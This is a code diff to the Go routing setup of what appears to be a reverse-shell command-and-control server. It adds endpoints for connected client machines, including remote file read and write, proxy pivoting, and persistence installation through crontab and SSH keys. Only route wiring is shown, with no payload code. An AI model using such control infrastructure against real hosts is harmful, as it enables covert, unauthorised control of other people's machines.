@@ -30,6 +30,7 @@ func CreateRESTfulAPIServer() *gin.Engine {
 		AllowCredentials: true,
 		MaxAge:           12 * time.Hour,
 	}))
+
 	endpoint.Use(gin.Recovery())
 	// Static files
 	endpoint.Use(static.Serve("/", fs.BinaryFileSystem("./web/frontend/build")))
@@ -42,23 +43,45 @@ func CreateRESTfulAPIServer() *gin.Engine {
 	{
 		// Refresh time can be longer than token timeout
 		needAuth.GET("/refresh_token", authMiddleware.RefreshHandler)
-		serverAPIGroup := needAuth.Group("/server")
+		serverAPIGroup := needAuth.Group("/servers")
 		{
-			serverAPIGroup.GET("", model_server.ListServers)
-			serverAPIGroup.GET("/:hash", model_server.GetServerInfo)
-			serverAPIGroup.GET("/:hash/client", model_server.GetServerClients)
+			serverAPIGroup.GET("", model_server.GetAllServers)
 			serverAPIGroup.POST("", model_server.CreateServer)
+			serverAPIGroup.GET("/:hash", model_server.GetServer)
+			serverAPIGroup.GET("/:hash/start", model_server.StartServer)
+			serverAPIGroup.GET("/:hash/stop", model_server.StopServer)
+			serverAPIGroup.GET("/:hash/clients", model_server.GetAllClientsOfServer)
 			serverAPIGroup.DELETE("/:hash", model_server.DeleteServer)
 		}
-		clientAPIGroup := needAuth.Group("/client")
+		clientAPIGroup := needAuth.Group("/clients")
 		{
-			// Client related
-			clientAPIGroup.GET("", model_client.ListAllClients)
-			clientAPIGroup.GET("/:hash", model_client.GetClientInfo)
-			// Upgrade reverse shell client to termite client
-			clientAPIGroup.GET("/:hash/upgrade/:target", model_client.UpgradeClient)
+			clientAPIGroup.GET("", model_client.GetAllClients)
+			// Basic operations
+			clientAPIGroup.GET("/:hash", model_client.GetClient)
+			clientAPIGroup.GET("/:hash/collect", model_client.CollectClientInfo)
+			// Proxies
+			clientAPIGroup.GET("/:hash/proxies", model_client.GetAllProxies)
+			clientAPIGroup.POST("/:hash/proxies", model_client.CreateProxy)
+			clientAPIGroup.DELETE("/:hash/proxies", model_client.DeleteProxy)
+			clientAPIGroup.GET("/:hash/proxies/:pid/start", model_client.StartProxy)
+			clientAPIGroup.GET("/:hash/proxies/:pid/stop", model_client.StopProxy)
+			// Lib functions
+			clientAPIGroup.POST("/:hash/lib/readdir", model_client.LibReadDir)
+			clientAPIGroup.POST("/:hash/lib/stat", model_client.LibStat)
+			clientAPIGroup.POST("/:hash/lib/readfile", model_client.LibReadFile)
+			clientAPIGroup.POST("/:hash/lib/writefile", model_client.LibWriteFile)
+			clientAPIGroup.POST("/:hash/lib/fopen", model_client.LibFopen)
+			clientAPIGroup.POST("/:hash/lib/fseek", model_client.LibFseek)
+			clientAPIGroup.POST("/:hash/lib/fread", model_client.LibFread)
+			clientAPIGroup.POST("/:hash/lib/fwrite", model_client.LibFwrite)
+			clientAPIGroup.POST("/:hash/lib/fclose", model_client.LibFclose)
+			// Persistence
+			clientAPIGroup.GET("/:hash/persistence/crontab/install", model_client.InstallCrontab)
+			clientAPIGroup.GET("/:hash/persistence/sshkey/install", model_client.InstallSshKey)
+			// Upgrade
+			clientAPIGroup.POST("/:hash/upgrade/:target", model_client.UpgradeToTermite)
+			// Delete
 			clientAPIGroup.DELETE("/:hash", model_client.DeleteClient)
-			clientAPIGroup.POST("/:hash", model_client.ExecuteCommand)
 		}
 		// Notification
 		context.Ctx.NotifyWebSocket = websocket.CreateWebSocketServer()
